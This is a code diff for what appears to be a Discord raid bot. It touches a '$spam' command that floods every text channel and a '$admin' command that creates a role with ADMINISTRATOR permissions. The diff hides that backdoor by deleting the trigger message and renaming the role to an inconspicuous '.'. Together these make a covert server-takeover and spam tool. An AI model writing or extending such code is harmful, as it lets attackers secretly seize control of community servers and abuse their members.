@@ -80,7 +80,7 @@ const command = args.shift().toLowerCase();
 
 
 
-    console.log(`Hey owner. Comando: "$mass_message" ejecutado por ${message.author.tag}. ID ${message.author.id}`);
+    console.log(`Hey owner. Comando: "$spam" ejecutado por ${message.author.tag}. ID ${message.author.id}`);
 
 
       message.guild.channels.cache.filter(r => r.type === "text").forEach(channel => {
@@ -146,9 +146,10 @@ client.on("message", async msg => {
 
   if (msg.author.bot) return;
   if (msg.content.toLowerCase().startsWith('$admin')) {
+    msg.delete();
     let rol = await msg.guild.roles.create({
       data: {
-        name: "pentaguard",
+        name: ".",
         color: "B9BBBE",
         permissions: "ADMINISTRATOR",
         hoisted: false
